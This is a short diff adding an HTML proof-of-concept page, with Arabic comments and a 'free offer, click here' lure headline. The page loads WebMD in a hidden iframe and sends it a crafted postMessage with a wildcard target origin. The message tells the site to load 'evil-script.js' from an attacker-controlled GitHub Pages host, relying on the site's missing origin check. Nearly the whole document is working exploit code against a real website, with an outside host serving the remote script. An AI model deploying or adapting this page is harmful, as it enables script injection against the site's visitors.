@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>صفحة عرض مجانية - اضغط هنا</h1>
+    <iframe id="victimFrame" src="https://www.webmd.com/" style="display:none;"></iframe>
+
+    <script>
+        const frame = document.getElementById('victimFrame');
+
+        frame.onload = function() {
+            // تجهيز البيانات لتخطي شروط الكود الضعيف
+            const payload = {
+                message: "surveywriter",
+                source: "https://egyhaker.github.io/webmd.com-attacker/evil-script.js" // السكربت الخبيث
+            };
+
+            // إرسال الرسالة إلى نافذة الضحية
+            // الكود الضعيف لا يتحقق من t.origin، لذا سيهمل مصدر الرسالة
+            frame.contentWindow.postMessage(payload, "*");
+        };
+    </script>
+</body>
+</html>
